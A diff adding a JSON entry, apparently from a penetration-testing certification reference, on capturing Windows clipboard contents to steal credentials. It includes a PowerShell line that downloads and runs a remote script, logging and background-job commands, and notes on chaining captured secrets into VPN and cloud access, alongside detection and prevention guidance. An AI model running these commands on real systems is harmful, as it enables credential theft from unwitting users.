@@ -1,0 +1,90 @@
+{
+  "type": "command",
+  "platform": "windows",
+  "requires": [
+    "local-access"
+  ],
+  "protocols": [],
+  "tools": [
+    "powershell"
+  ],
+  "tags": [
+    "clipboard",
+    "credentials",
+    "monitoring"
+  ],
+  "category": "Privilege Escalation",
+  "subcategory": "Windows - Interacting with Users",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 26: Windows Privilege Escalation",
+  "examples": [
+    {
+      "label": "Load the clipboard logger in-memory",
+      "command": "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')"
+    },
+    {
+      "label": "Start logging the clipboard",
+      "command": "Invoke-ClipboardLogger"
+    }
+  ],
+  "notes": "=== Clipboard Monitoring — Passive Credential Capture ===\nPoll Windows clipboard at intervals to capture copy-pasted credentials, tokens, and sensitive data.\n\n=== WHY CLIPBOARD OVER KEYLOGGER ===\nPassword managers and admin tools use copy-paste for credentials — keyloggers miss these\n2FA/TOTP codes copied from authenticator apps = captured in clipboard\nOften faster than waiting for keyboard input — users copy-paste frequently during work\n\n=== TOOL ===\nInvoke-ClipboardLogger (PowerShell script):\n  Import-Module .\\Invoke-ClipboardLogger.ps1\n  Invoke-ClipboardLogger\n\nRuns in a loop polling the clipboard on a regular interval\nPrints any new content to console (redirect to file for background capture):\n  Invoke-ClipboardLogger | Tee-Object -FilePath C:\\Temp\\clipboard.log\n\nBackground execution (PowerShell Job):\n  Start-Job { Import-Module C:\\Tools\\Invoke-ClipboardLogger.ps1; Invoke-ClipboardLogger } | Wait-Job | Receive-Job\n\n=== WHAT GETS CAPTURED ===\nPasswords from KeePass/1Password/LastPass (user copy-pastes from vault to browser)\n2FA codes from authenticator apps\nAPI keys copied from documentation or portals\nDatabase connection strings copied from admin tools\nSSH private keys copied during key management tasks\nInternal URLs with embedded tokens\n\n=== OPERATIONAL NOTES ===\nRequires persistent session on target while user is actively working\nMust run in same session as target user (same desktop context) — not accessible across terminal server sessions\nMost valuable during business hours when users are actively logged in\nStop and remove after capturing credentials — avoid leaving monitoring tools on production systems\n\n=== CHAINING CONTEXT ===\nClipboard capture during active user session → KeePass master password → all org credentials\nClipboard capture → VPN token → 2FA bypass → VPN access\nClipboard capture → cloud console session token → AWS/Azure pivot\nCombine with process monitoring (process-cmdline-monitor) for comprehensive passive credential capture",
+  "references": [
+    {
+      "title": "Invoke-Clipboard (inguardians)",
+      "url": "https://github.com/inguardians/Invoke-Clipboard"
+    },
+    {
+      "title": "HTB Academy - Windows Privilege Escalation",
+      "url": "https://academy.hackthebox.com/module/details/67"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "scf-responder-hash",
+      "note": "Force-auth capture as an alternative.",
+      "rel": "alternative"
+    },
+    {
+      "id": "process-cmdline-monitor",
+      "note": "Command-line capture as an alternative.",
+      "rel": "alternative"
+    },
+    {
+      "id": "powershell-clixml-decrypt",
+      "rel": "next",
+      "note": "Continue enumeration/technique in this area"
+    }
+  ],
+  "id": "clipboard-logger",
+  "name": "Interacting with Users - Clipboard Logger",
+  "command": "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1'); Invoke-ClipboardLogger",
+  "description": "Captures clipboard contents over time - users frequently copy/paste passwords, so this often yields plaintext credentials from an active session.",
+  "opsec": "loud",
+  "mitre": [
+    "T1115"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "Windows clipboard content is accessible to any process running in the same user session via the Win32 API. A PowerShell script using Invoke-ClipboardLogger polls the clipboard at regular intervals, capturing any text copied by the user — including passwords copied from a password manager, usernames, tokens, or sensitive data.",
+    "prerequisites": "Shell access in the same user session as the victim. PowerShell execution. Access to or ability to download Invoke-Clipboard.ps1.",
+    "impact": "Capture of credentials, tokens, or sensitive data copied to clipboard by the user — enabling privilege escalation or lateral movement if admin credentials are copied.",
+    "detection": "PowerShell downloading and executing Invoke-Clipboard.ps1. Long-running PowerShell process accessing clipboard API at regular intervals. EDR: clipboard access by non-standard process.",
+    "artifacts": "Process log: PowerShell executing clipboard monitoring script | Network: IEX downloading Invoke-Clipboard.ps1 | EDR: clipboard API access pattern",
+    "prevention": "Enable PowerShell Script Block Logging to detect clipboard monitoring scripts. Deploy EDR detecting clipboard API abuse. Consider using clipboard isolation features in modern Windows (Clipboard History purge, restricted session). Never copy sensitive credentials to clipboard if session may be compromised.",
+    "misconfiguration": "No PowerShell logging. No EDR detecting clipboard monitoring. User copies admin credentials to clipboard while an attacker has a foothold in the same user session.",
+    "vulnerable_config": "# Invoke-Clipboard monitors clipboard content:\nIEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')\nInvoke-ClipboardLogger\n# Captures everything the user copies: passwords, tokens, sensitive data",
+    "secure_config": "# Enable PowerShell Script Block Logging\nNew-Item -Path HKLM:\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging -Force\nSet-ItemProperty -Path HKLM:\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging -Name EnableScriptBlockLogging -Value 1\n\n# Deploy EDR with clipboard monitoring detection\n# User guidance: use password manager with auto-fill instead of clipboard copy",
+    "sources": [
+      "HTB M26",
+      "MITRE T1115"
+    ]
+  }
+}
